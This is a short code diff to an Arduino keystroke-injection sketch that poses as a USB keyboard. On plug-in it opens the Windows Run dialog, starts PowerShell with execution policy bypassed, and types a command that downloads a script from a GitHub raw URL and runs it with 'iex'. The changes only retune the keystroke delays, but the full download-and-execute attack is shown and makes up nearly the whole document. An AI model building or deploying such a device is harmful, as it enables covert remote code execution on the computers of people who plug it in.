@@ -4,25 +4,26 @@ const char* payload = "iex \"& {$(irm https://raw.githubusercontent.com/calinux-
 
 void setup() {
   Keyboard.begin();
-  delay(2400); 
+  delay(3500); 
   Keyboard.press(KEY_LEFT_GUI);
   Keyboard.press('r');
-  delay(200);
+  delay(500);
   Keyboard.releaseAll();
-  delay(800);
+  delay(250);
   Keyboard.print("powershell -NoP -ExecutionPolicy Bypass");
-  delay(200);
+  delay(1250);
   Keyboard.press(KEY_RETURN);
-  delay(100);
+  delay(250);
   Keyboard.releaseAll();
-  delay(1000);
+  delay(3000);
   Keyboard.print(payload);
+  delay(250);
   Keyboard.print("; exit");
-  delay(200);
+  delay(750);
   Keyboard.press(KEY_RETURN);
-  delay(100);
+  delay(250);
   Keyboard.releaseAll();
   Keyboard.end();
 }
-
 void loop() {}
+
